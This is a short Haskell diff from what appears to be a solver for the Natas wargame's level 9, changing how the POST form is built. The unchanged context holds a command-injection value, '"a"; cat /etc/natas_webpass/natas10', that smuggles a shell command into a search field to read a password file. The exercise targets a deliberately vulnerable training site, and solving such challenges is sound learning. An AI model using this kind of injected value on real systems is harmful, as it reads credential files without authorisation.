@@ -14,7 +14,7 @@ import           Natas.Parse
 solution :: Solution
 solution = do
   let needle = "\"a\"; cat /etc/natas_webpass/natas10"
-      form = [partBS "needle" needle, partBS "submit" "Search"]
+      form = partBS "needle" needle
   req <- postLevel 9 form
   let body = reqBody req
       match = catMaybes (workupBody' (fmap headMay) body)
